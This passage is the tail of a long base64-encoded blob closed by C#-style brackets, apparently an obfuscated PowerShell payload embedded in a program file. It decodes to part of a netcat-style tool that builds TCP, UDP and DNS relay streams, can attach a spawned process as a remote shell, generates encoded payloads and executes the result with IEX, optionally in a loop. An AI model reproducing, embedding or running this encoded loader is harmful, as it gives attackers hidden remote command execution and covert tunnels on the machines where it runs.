3Rpb246V3JpdGVEYXRhX1RDUH0gKyAiYG59YG5gbiIpCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfVENQfSArICJgbn1gbmBuIikKICAgICAgICBpZiAoJGwpIHskSW52b2tlU3RyaW5nID0gIk1haW4gQCgnJyxgJFRydWUsJHAsJHQpICJ9CiAgICAgICAgZWxzZSB7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJyRjJyxgJEZhbHNlLCRwLCR0KSAifQogICAgfQogIAogICAgaWYgKCRlIC1uZSAiIikgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogUHJvY2VzcyIKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9DTUR9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX0NNRH0gKyAiYG59YG5gbiIpCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9DTUR9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX0NNRH0gKyAiYG59YG5gbiIpCiAgICAgICAgJEludm9rZVN0cmluZyArPSAiQCgnJGUnKWBuYG4iCiAgICB9CiAgICBlbHNlaWYgKCRlcCkgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogUG93ZXJzaGVsbCIKICAgICAgICAkSW52b2tlU3RyaW5nICs9ICJgbmBuIgogICAgfQogICAgZWxzZWlmICgkciAtbmUgIiIpIHsKICAgICAgICBpZiAoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJ1ZHAiKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogVURQIgogICAgICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9VRFB9ICsgImBufWBuYG4iKQogICAgICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9VRFB9ICsgImBufWBuYG4iKQogICAgICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1VEUH0gKyAiYG59YG5gbiIpCiAgICAgICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX1VEUH0gKyAiYG59YG5gbiIpICAgIAogICAgICAgICAgICBpZiAoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMikgeyRJbnZva2VTdHJpbmcgKz0gKCJAKCcnLGAkVHJ1ZSwnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJywnJHQnKSAiKX0KICAgICAgICAgICAgZWxzZWlmICgkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAzKSB7JEludm9rZVN0cmluZyArPSAoIkAoJyIgKyAkci5zcGxpdCgiOiIpWzFdICsgIicsYCRGYWxzZSwnIiArICRyLnNwbGl0KCI6IilbMl0gKyAiJywnJHQnKSAiKX0KICAgICAgICAgICAgZWxzZSB7cmV0dXJuICJCYWQgcmVsYXkgZm9ybWF0LiJ9CiAgICAgICAgfQogICAgICAgIGlmICgkci5zcGxpdCgiOiIpWzBdLlRvTG93ZXIoKSAtZXEgImRucyIpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAyOiBETlMiCiAgICAgICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX0ROU30gKyAiYG59YG5gbiIpCiAgICAgICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX0ROU30gKyAiYG59YG5gbiIpCiAgICAgICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfRE5TfSArICJgbn1gbmBuIikKICAgICAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfRE5TfSArICJgbn1gbmBuIikKICAgICAgICAgICAgaWYgKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpIHtyZXR1cm4gIlRoaXMgZmVhdHVyZSBpcyBub3QgYXZhaWxhYmxlLiJ9CiAgICAgICAgICAgIGVsc2VpZiAoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgNCkgeyRJbnZva2VTdHJpbmcgKz0gKCJAKCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLCciICsgJHIuc3BsaXQoIjoiKVsyXSArICInLCciICsgJHIuc3BsaXQoIjoiKVszXSArICInLCRkbnNmdCkgIil9CiAgICAgICAgICAgIGVsc2Uge3JldHVybiAiQmFkIHJlbGF5IGZvcm1hdC4ifQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRyLnNwbGl0KCI6IilbMF0uVG9Mb3dlcigpIC1lcSAidGNwIikgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFRDUCIKICAgICAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVENQfSArICJgbn1gbmBuIikKICAgICAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfVENQfSArICJgbn1gbmBuIikKICAgICAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9UQ1B9ICsgImBufWBuYG4iKQogICAgICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9UQ1B9ICsgImBufWBuYG4iKQogICAgICAgICAgICBpZiAoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMikgeyRJbnZva2VTdHJpbmcgKz0gKCJAKCcnLGAkVHJ1ZSwnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJywnJHQnKSAiKX0KICAgICAgICAgICAgZWxzZWlmICgkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAzKSB7JEludm9rZVN0cmluZyArPSAoIkAoJyIgKyAkci5zcGxpdCgiOiIpWzFdICsgIicsYCRGYWxzZSwnIiArICRyLnNwbGl0KCI6IilbMl0gKyAiJywnJHQnKSAiKX0KICAgICAgICAgICAgZWxzZSB7cmV0dXJuICJCYWQgcmVsYXkgZm9ybWF0LiJ9CiAgICAgICAgfQogICAgfQogICAgZWxzZSB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAyOiBDb25zb2xlIgogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX0NvbnNvbGV9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX0NvbnNvbGV9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfQ29uc29sZX0gKyAiYG59YG5gbiIpCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfQ29uc29sZX0gKyAiYG59YG5gbiIpCiAgICAgICAgJEludm9rZVN0cmluZyArPSAoIkAoJyIgKyAkbyArICInKSIpCiAgICB9CiAgCiAgICBpZiAoJGVwKSB7JEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gTWFpbmBue2BuIiArICR7ZnVuY3Rpb246TWFpbl9Qb3dlcnNoZWxsfSArICJgbn1gbmBuIil9CiAgICBlbHNlIHskRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBNYWluYG57YG4iICsgJHtmdW5jdGlvbjpNYWlufSArICJgbn1gbmBuIil9CiAgICAkSW52b2tlU3RyaW5nID0gKCRGdW5jdGlvblN0cmluZyArICRJbnZva2VTdHJpbmcpCiAgICAjIyMjIyMjIyMjIEdFTkVSQVRFIFBBWUxPQUQgIyMjIyMjIyMjIwogIAogICAgIyMjIyMjIyMjIyBSRVRVUk4gR0VORVJBVEVEIFBBWUxPQURTICMjIyMjIyMjIyMKICAgIGlmICgkZ2UpIHtXcml0ZS1WZXJib3NlICJSZXR1cm5pbmcgRW5jb2RlZCBQYXlsb2FkLi4uIiA7IHJldHVybiBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJEludm9rZVN0cmluZykpfQogICAgZWxzZWlmICgkZykge1dyaXRlLVZlcmJvc2UgIlJldHVybmluZyBQYXlsb2FkLi4uIiA7IHJldHVybiAkSW52b2tlU3RyaW5nfQogICAgIyMjIyMjIyMjIyBSRVRVUk4gR0VORVJBVEVEIFBBWUxPQURTICMjIyMjIyMjIyMKICAKICAgICMjIyMjIyMjIyMgRVhFQ1VUSU9OICMjIyMjIyMjIyMKICAgICRPdXRwdXQgPSAkbnVsbAogICAgdHJ5IHsKICAgICAgICBpZiAoJHJlcCkgewogICAgICAgICAgICB3aGlsZSAoJFRydWUpIHsKICAgICAgICAgICAgICAgICRPdXRwdXQgKz0gSUVYICRJbnZva2VTdHJpbmcKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1zIDIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlJlcGV0aXRpb24gRW5hYmxlZDogUmVzdGFydGluZy4uLiIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJE91dHB1dCArPSBJRVggJEludm9rZVN0cmluZwogICAgICAgIH0KICAgIH0KICAgIGZpbmFsbHkgewogICAgICAgIGlmICgkT3V0cHV0IC1uZSAkbnVsbCkgewogICAgICAgICAgICBpZiAoJG9mIC1lcSAiIikgeyRPdXRwdXR9CiAgICAgICAgICAgIGVsc2Uge1tpby5maWxlXTo6V3JpdGVBbGxCeXRlcygkb2YsICRPdXRwdXQpfQogICAgICAgIH0KICAgIH0KICAgICMjIyMjIyMjIyMgRVhFQ1VUSU9OICMjIyMjIyMjIyMKfQo="));
        }
    }
}
